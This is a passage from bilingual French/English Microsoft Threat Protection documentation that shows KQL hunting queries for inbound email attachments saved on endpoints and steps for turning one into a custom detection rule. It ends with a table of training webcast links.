<span data-ttu-id="10d0c-344">La requête suivante inclut également une ligne supplémentaire «| **Project-Rename EmailTimestamp = timestamp**"qui permettra d’identifier l’horodatage associé à la messagerie par rapport aux estampilles associées aux actions de fichiers que vous ajouterez lors de l’étape suivante.</span><span class="sxs-lookup"><span data-stu-id="10d0c-344">The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp**” that will help identify which timestamp was related to the email versus timestamps related to file actions which you will add in the next step.</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
```

6.  <span data-ttu-id="10d0c-345">Ensuite, utilisez la valeur **SHA256** de la table **EmailAttachmentInfo** pour rechercher **DeviceFileEvents** (actions de fichier qui se sont produites sur le point de terminaison) pour ce hachage.</span><span class="sxs-lookup"><span data-stu-id="10d0c-345">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span>  <span data-ttu-id="10d0c-346">Le champ courant ici est le hachage SHA256 de la pièce jointe.</span><span class="sxs-lookup"><span data-stu-id="10d0c-346">The common field here will be the SHA256 hash for the attachment.</span></span>

<span data-ttu-id="10d0c-347">Le tableau résultant inclut maintenant des détails du point de terminaison (Microsoft Defender ATP) tels que le nom de l’appareil, l’action effectuée (dans ce cas, filtrée pour inclure uniquement les événements FileCreated), ainsi que l’emplacement de stockage du fichier.</span><span class="sxs-lookup"><span data-stu-id="10d0c-347">The resulting table now includes details from the endpoint (Microsoft Defender ATP) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="10d0c-348">Le nom de compte associé au processus est également inclus.</span><span class="sxs-lookup"><span data-stu-id="10d0c-348">The account name associated with the process will also be included.</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
```

<span data-ttu-id="10d0c-349">Vous avez maintenant créé une requête qui identifiera tous les messages électroniques entrants dans lesquels l’utilisateur a ouvert ou enregistré la pièce jointe.</span><span class="sxs-lookup"><span data-stu-id="10d0c-349">You have now created a query that will identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="10d0c-350">Vous pouvez également affiner cette requête pour filtrer des domaines d’expéditeurs spécifiques, des tailles de fichiers, des types de fichiers, etc.</span><span class="sxs-lookup"><span data-stu-id="10d0c-350">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7.  <span data-ttu-id="10d0c-351">Les fonctions sont un type de participation spéciale qui vous permet d’extraire plus de données TI sur un fichier, telles que sa prévalence, son signataire et ses informations d’émetteur, etc.  Pour obtenir plus de détails sur le fichier, utilisez l’enrichissement de la fonction **FileProfile ()** :</span><span class="sxs-lookup"><span data-stu-id="10d0c-351">Functions are a special sort of join which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
| distinct SHA1
| invoke FileProfile()
```


<span data-ttu-id="10d0c-352">**Créer une détection**</span><span class="sxs-lookup"><span data-stu-id="10d0c-352">**Create a detection**</span></span>

<span data-ttu-id="10d0c-353">Une fois que vous avez créé une requête qui identifie les informations dont vous souhaitez être **alerté** si elles se produisent à l’avenir, vous pouvez créer une détection personnalisée à partir de la requête.</span><span class="sxs-lookup"><span data-stu-id="10d0c-353">Once you have created a query that identifies information that you would like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span> 

<span data-ttu-id="10d0c-354">Les détections personnalisées exécuteront la requête en fonction de la fréquence que vous avez définie et les résultats des requêtes créeront des alertes de sécurité, en fonction des ressources affectées que vous avez choisies.</span><span class="sxs-lookup"><span data-stu-id="10d0c-354">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="10d0c-355">Ces alertes seront corrélées aux incidents et peuvent être triées comme toute autre alerte de sécurité générée par l’un des produits.</span><span class="sxs-lookup"><span data-stu-id="10d0c-355">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1.  <span data-ttu-id="10d0c-356">Sur la page de requête, supprimez les lignes 7 et 8 ajoutées à l’étape 7 des instructions de recherche de déplacement, puis cliquez sur **créer une règle de détection**.</span><span class="sxs-lookup"><span data-stu-id="10d0c-356">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span> 
    
    ![Capture d’écran de l’emplacement où vous pouvez cliquer sur créer une règle de détection dans la page recherche avancée](../../media/mtp/fig22.png) 

>[!NOTE]
><span data-ttu-id="10d0c-358">Si vous cliquez sur **créer une règle de détection** et que vous avez des erreurs de syntaxe dans votre requête, votre règle de détection n’est pas enregistrée.</span><span class="sxs-lookup"><span data-stu-id="10d0c-358">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won’t be saved.</span></span> <span data-ttu-id="10d0c-359">Vérifiez votre requête pour vous assurer qu’il n’y a pas d’erreurs.</span><span class="sxs-lookup"><span data-stu-id="10d0c-359">Double-check your query to ensure there’s no errors.</span></span> 


2.  <span data-ttu-id="10d0c-360">Renseignez les champs obligatoires avec les informations qui permettront à l’équipe de sécurité de comprendre l’alerte, la raison pour laquelle elle a été générée et les actions que vous attendez.</span><span class="sxs-lookup"><span data-stu-id="10d0c-360">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span> 

    ![Capture d’écran de la page créer une règle de détection dans laquelle vous pouvez définir les détails de l’alerte](../../media/mtp/fig23.png)

<span data-ttu-id="10d0c-362">Assurez-vous de renseigner les champs avec clarté pour permettre à l’utilisateur suivant de prendre une décision informée sur cette alerte de règle de détection.</span><span class="sxs-lookup"><span data-stu-id="10d0c-362">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span> 

3.  <span data-ttu-id="10d0c-363">Sélectionnez les entités concernées par cette alerte.</span><span class="sxs-lookup"><span data-stu-id="10d0c-363">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="10d0c-364">Dans ce cas, sélectionnez **appareil** et **boîte aux lettres**.</span><span class="sxs-lookup"><span data-stu-id="10d0c-364">In this case, select **Device** and **Mailbox**.</span></span>

    ![Capture d’écran de la page créer une règle de détection dans laquelle vous pouvez choisir les paramètres des entités concernées](../../media/mtp/fig24.png)
 

4.  <span data-ttu-id="10d0c-366">Déterminez les actions qui doivent avoir lieu si l’alerte est déclenchée.</span><span class="sxs-lookup"><span data-stu-id="10d0c-366">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="10d0c-367">Dans ce cas, exécutez une analyse antivirus, même si d’autres actions ont pu être menées.</span><span class="sxs-lookup"><span data-stu-id="10d0c-367">In this case, run an antivirus scan, though other actions could be taken.</span></span> 

    ![Capture d’écran de la page créer une règle de détection dans laquelle vous pouvez exécuter une analyse antivirus lorsqu’une alerte est déclenchée pour aider à résoudre les menaces](../../media/mtp/fig25.png) 

5.  <span data-ttu-id="10d0c-369">Sélectionnez l’étendue de la règle d’alerte.</span><span class="sxs-lookup"><span data-stu-id="10d0c-369">Select the scope for the alert rule.</span></span> <span data-ttu-id="10d0c-370">Dans la mesure où cette requête implique des périphériques, les groupes d’appareils sont pertinents dans cette détection personnalisée conformément au contexte de Microsoft Defender ATP.</span><span class="sxs-lookup"><span data-stu-id="10d0c-370">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender ATP context.</span></span>  <span data-ttu-id="10d0c-371">Lors de la création d’une détection personnalisée qui n’inclut pas d’appareils en tant qu’entités affectées, l’étendue ne s’applique pas.</span><span class="sxs-lookup"><span data-stu-id="10d0c-371">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>  

    ![Capture d’écran de la page créer une règle de détection dans laquelle vous pouvez définir l’étendue de la règle d’alerte gère vos attentes pour les résultats que vous verrez](../../media/mtp/fig26.png) 

<span data-ttu-id="10d0c-373">Pour ce projet pilote, vous pouvez limiter cette règle à un sous-ensemble de périphériques de test dans votre environnement de production.</span><span class="sxs-lookup"><span data-stu-id="10d0c-373">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6.  <span data-ttu-id="10d0c-374">Sélectionnez **Créer**.</span><span class="sxs-lookup"><span data-stu-id="10d0c-374">Select **Create**.</span></span> <span data-ttu-id="10d0c-375">Ensuite, sélectionnez **règles de détection personnalisées** dans le panneau de navigation.</span><span class="sxs-lookup"><span data-stu-id="10d0c-375">Then, select **Custom detection rules** from the navigation panel.</span></span>
 
    ![Capture d’écran de l’option règles de détection personnalisées dans le menu](../../media/mtp/fig27a.png) 

    ![Capture d’écran de la page règles de détection qui affiche les détails de la règle et de l’exécution](../../media/mtp/fig27b.png) 

<span data-ttu-id="10d0c-378">À partir de cette page, vous pouvez sélectionner la règle de détection qui ouvrira une page de détails.</span><span class="sxs-lookup"><span data-stu-id="10d0c-378">From this page, you can select the detection rule which will open a details page.</span></span> 

![Capture d’écran de la page pièces jointes de courrier électronique où vous pouvez voir l’état de l’exécution de la règle, des alertes déclenchées et des actions, modifier la détection, etc.](../../media/mtp/fig28.png) 

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="10d0c-380">Exercices supplémentaires de la chasse à la chasse</span><span class="sxs-lookup"><span data-stu-id="10d0c-380">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="10d0c-381">Pour en savoir plus sur la chasse avancée, les présentations techniques en ligne suivantes vous guideront tout au long des fonctionnalités de la recherche avancée dans Microsoft Threat Protection (MTP) pour créer des requêtes à plusieurs piliers, les faire pivoter vers des entités et créer des détections personnalisées et des actions correctives.</span><span class="sxs-lookup"><span data-stu-id="10d0c-381">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft Threat Protection (MTP) to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

>[!NOTE]
><span data-ttu-id="10d0c-382">Préparez-vous avec votre propre compte GitHub pour exécuter les requêtes de chasse dans votre environnement de laboratoire de test pilote.</span><span class="sxs-lookup"><span data-stu-id="10d0c-382">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>  

| <span data-ttu-id="10d0c-383">**Titre**</span><span class="sxs-lookup"><span data-stu-id="10d0c-383">**Title**</span></span> | <span data-ttu-id="10d0c-384">**Description**</span><span class="sxs-lookup"><span data-stu-id="10d0c-384">**Description**</span></span> | <span data-ttu-id="10d0c-385">**Télécharger MP4**</span><span class="sxs-lookup"><span data-stu-id="10d0c-385">**Download MP4**</span></span> | <span data-ttu-id="10d0c-386">**Regarder sur YouTube**</span><span class="sxs-lookup"><span data-stu-id="10d0c-386">**Watch on YouTube**</span></span> | <span data-ttu-id="10d0c-387">**Fichier CSL à utiliser**</span><span class="sxs-lookup"><span data-stu-id="10d0c-387">**CSL file to use**</span></span> |
|:-----|:-----|:-----|:-----|:-----|
| <span data-ttu-id="10d0c-388">Épisode 1 : notions de base de KQL</span><span class="sxs-lookup"><span data-stu-id="10d0c-388">Episode 1: KQL fundamentals</span></span> | <span data-ttu-id="10d0c-389">Nous allons aborder les notions de base des fonctionnalités de chasse avancées dans la protection contre les menaces Microsoft.</span><span class="sxs-lookup"><span data-stu-id="10d0c-389">We’ll cover the basics of advanced hunting capabilities in Microsoft Threat Protection.</span></span> <span data-ttu-id="10d0c-390">Découvrez les données de chasse avancées et les opérateurs et la syntaxe de KQL de base.</span><span class="sxs-lookup"><span data-stu-id="10d0c-390">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span> | [<span data-ttu-id="10d0c-391"> MP4</span><span class="sxs-lookup"><span data-stu-id="10d0c-391"> MP4</span></span>](https://aka.ms/MTP15JUL20_MP4) | [<span data-ttu-id="10d0c-392">YouTube</span><span class="sxs-lookup"><span data-stu-id="10d0c-392">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM) | [<span data-ttu-id="10d0c-393">Épisode 1 : fichier CSL dans Git</span><span class="sxs-lookup"><span data-stu-id="10d0c-393">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
| <span data-ttu-id="10d0c-394">Épisode 2 : jointures</span><span class="sxs-lookup"><span data-stu-id="10d0c-394">Episode 2: Joins</span></span> | <span data-ttu-id="10d0c-395">Nous continuerons à étudier les données dans la chasse avancée et à rejoindre les tables ensemble.</span><span class="sxs-lookup"><span data-stu-id="10d0c-395">We’ll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="10d0c-396">Découvrez les Kusto internes, externes, uniques et semi-jointures, ainsi que les nuances de la jointure innerunique par défaut.</span><span class="sxs-lookup"><span data-stu-id="10d0c-396">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span> | [<span data-ttu-id="10d0c-397">MP4</span><span class="sxs-lookup"><span data-stu-id="10d0c-397">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4) | [<span data-ttu-id="10d0c-398">YouTube</span><span class="sxs-lookup"><span data-stu-id="10d0c-398">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU) | [<span data-ttu-id="10d0c-399">Épisode 2 : fichier CSL dans Git</span><span class="sxs-lookup"><span data-stu-id="10d0c-399">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
| <span data-ttu-id="10d0c-400">Épisode 3 : résumé, glissement et visualisation des données</span><span class="sxs-lookup"><span data-stu-id="10d0c-400">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="10d0c-401">Maintenant que nous pouvons filtrer, manipuler et joindre des données, il est temps de commencer à résumer, quantifier, faire pivoter et visualiser.</span><span class="sxs-lookup"><span data-stu-id="10d0c-401">Now that we’re able to filter, manipulate, and join data, it’s time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="10d0c-402">Dans cet épisode, nous allons aborder l’opérateur de synthèse et certains des calculs que vous pouvez effectuer lors de la plongée dans des tableaux supplémentaires dans le schéma de chasse avancé.</span><span class="sxs-lookup"><span data-stu-id="10d0c-402">In this episode, we’ll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="10d0c-403">Nous transformerons nos jeux de données en graphiques qui peuvent aider à améliorer l’analyse.</span><span class="sxs-lookup"><span data-stu-id="10d0c-403">We turn our datasets into charts that can help improve analysis.</span></span> | [<span data-ttu-id="10d0c-404">MP4</span><span class="sxs-lookup"><span data-stu-id="10d0c-404">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4) | [<span data-ttu-id="10d0c-405">YouTube</span><span class="sxs-lookup"><span data-stu-id="10d0c-405">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y) | [<span data-ttu-id="10d0c-406">Épisode 3 : fichier CSL dans Git</span><span class="sxs-lookup"><span data-stu-id="10d0c-406">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl) |
| <span data-ttu-id="10d0c-407">Épisode 4 : allons-nous !</span><span class="sxs-lookup"><span data-stu-id="10d0c-407">Episode 4: Let’s hunt!</span></span> <span data-ttu-id="10d0c-408">Application de KQL au suivi des incidents</span><span class="sxs-lookup"><span data-stu-id="10d0c-408">Applying KQL to incident tracking</span></span>|<span data-ttu-id="10d0c-409">Temps nécessaire pour effectuer le suivi de certaines activités d’agresseurs !</span><span class="sxs-lookup"><span data-stu-id="10d0c-409">Time to track some attacker activity!</span></span> <span data-ttu-id="10d0c-410">Dans cet épisode, nous allons utiliser notre compréhension améliorée de KQL et de la recherche avancée dans Microsoft Threat Protection pour suivre une attaque.</span><span class="sxs-lookup"><span data-stu-id="10d0c-410">In this episode, we’ll use our improved understanding of KQL and advanced hunting in Microsoft Threat Protection to track an attack.</span></span> <span data-ttu-id="10d0c-411">Découvrez les trucs et astuces utilisés dans le champ pour suivre les activités des agresseurs, notamment les éléments de la Cybersecurity et la façon de les appliquer à la réponse aux incidents.</span><span class="sxs-lookup"><span data-stu-id="10d0c-411">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span> | [<span data-ttu-id="10d0c-412">MP4</span><span class="sxs-lookup"><span data-stu-id="10d0c-412">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4) | [<span data-ttu-id="10d0c-413">YouTube</span><span class="sxs-lookup"><span data-stu-id="10d0c-413">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8) | [<span data-ttu-id="10d0c-414">Épisode 4 : fichier CSL dans Git</span><span class="sxs-lookup"><span data-stu-id="10d0c-414">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl) |

## <a name="next-step"></a><span data-ttu-id="10d0c-415">Étape suivante</span><span class="sxs-lookup"><span data-stu-id="10d0c-415">Next step</span></span>
|<span data-ttu-id="10d0c-416">![Phase de clôture et de synthèse](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="10d0c-416">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="10d0c-417">Phase de clôture et de synthèse</span><span class="sxs-lookup"><span data-stu-id="10d0c-417">Closing and summary phase</span></span>](mtp-pilot-close.md) | <span data-ttu-id="10d0c-418">Analysez votre résultat pilote de protection contre les menaces Microsoft, présentez-les à vos parties prenantes et effectuez l’étape suivante.</span><span class="sxs-lookup"><span data-stu-id="10d0c-418">Analyze your Microsoft Threat Protection pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|

